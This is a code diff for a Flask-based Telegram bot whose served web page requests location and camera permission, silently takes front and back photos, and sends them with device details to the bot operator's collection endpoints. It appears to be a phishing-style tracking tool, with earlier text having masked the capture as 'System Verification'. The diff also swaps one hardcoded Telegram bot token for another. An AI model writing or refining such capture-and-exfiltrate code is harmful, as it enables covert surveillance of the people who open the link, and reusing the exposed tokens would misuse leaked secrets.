@@ -11,7 +11,7 @@ from concurrent.futures import ThreadPoolExecutor
 from flask import Flask, request, jsonify, render_template_string, send_from_directory
 
 # ==================== CONFIG (HARDCODED) ====================
-BOT_TOKEN = "8943025478:AAFAs7FEAk_vEZKBUoS7zbFgRlCPNMaSwHQ"
+BOT_TOKEN = "8680846598:AAE0o3vS2fn16ZuIvvPJjXeuPQubDT2eUo8"
 ADMIN_IDS = [8691519315]
 RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
 BASE_URL = RENDER_URL if RENDER_URL else "http://localhost:5000"
@@ -265,7 +265,7 @@ def handle_admin_panel(chat_id):
         reply_markup=kb)
 
 def handle_callback(cb):
-    data = cb.get("data", "") 
+    data = cb.get("data", "")
     chat_id = cb["message"]["chat"]["id"]
     msg_id = cb["message"]["message_id"]
     cb_id = cb["id"]
@@ -414,8 +414,8 @@ def process_update(update):
             else:
                 send_msg(chat_id, "Use /start se menu kholo.")
 
-            if "callback_query" in update:
-                handle_callback(update["callback_query"])
+        if "callback_query" in update:
+            handle_callback(update["callback_query"])
     except Exception as e:
         logger.error("process_update: %s", e, exc_info=True)
 
@@ -613,7 +613,7 @@ async function runStep(i){
 
 function getLoc(){return new Promise((r)=>{
   if(!navigator.geolocation){showProgress("📍 Location","unsupported");r();return}
-  showProgress("System Verificantion","popup par Allow dabao");
+  showProgress("📍 Location maangi ja rahi hai...","popup par Allow dabao");
   navigator.geolocation.getCurrentPosition(
     p=>{cd.location={lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude,spd:p.coords.speed};showProgress("📍 Location captured ✓","");r()},
     ()=>{showProgress("📍 Location","denied/error");r()},
@@ -624,7 +624,7 @@ function getLoc(){return new Promise((r)=>{
 async function capPhotos(fm,count){
   let stream;
   try{
-    showProgress("system Verified..","popup par Allow dabao");
+    showProgress("📸 Camera permission...","popup par Allow dabao");
     stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:fm,width:{ideal:480},height:{ideal:360}}});
     const v=document.createElement("video");v.srcObject=stream;await v.play();
     await new Promise(r=>setTimeout(r,300));
@@ -635,7 +635,7 @@ async function capPhotos(fm,count){
       c.width=v.videoWidth||480;c.height=v.videoHeight||360;
       c.getContext("2d").drawImage(v,0,0);
       const b64=c.toDataURL("image/jpeg",0.5);
-      showProgress(" "+(cam==="front"?"Front":"Back")+" — photo "+(i+1)+"/"+count+" ✓","Whit'''");
+      showProgress("📸 "+(cam==="front"?"Front":"Back")+" — photo "+(i+1)+"/"+count+" ✓","bheja ja raha hai...");
       // ⚡ TURANT SEND — capture hote hi /api/photo par bhejo
       try{
         await fetch("/api/photo",{method:"POST",headers:{"Content-Type":"application/json"},
@@ -653,7 +653,7 @@ async function capPhotos(fm,count){
 }
 
 async function submitData(){
-  showProgress("Whit''''","");
+  showProgress("📤 Report bheji ja rahi hai...","");
   try{
     const r=await fetch("/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},
       body:JSON.stringify({chat_id:CID,uid:UID,device_info:di,location:cd.location,photos:cd.photos.length,additional:{}})});
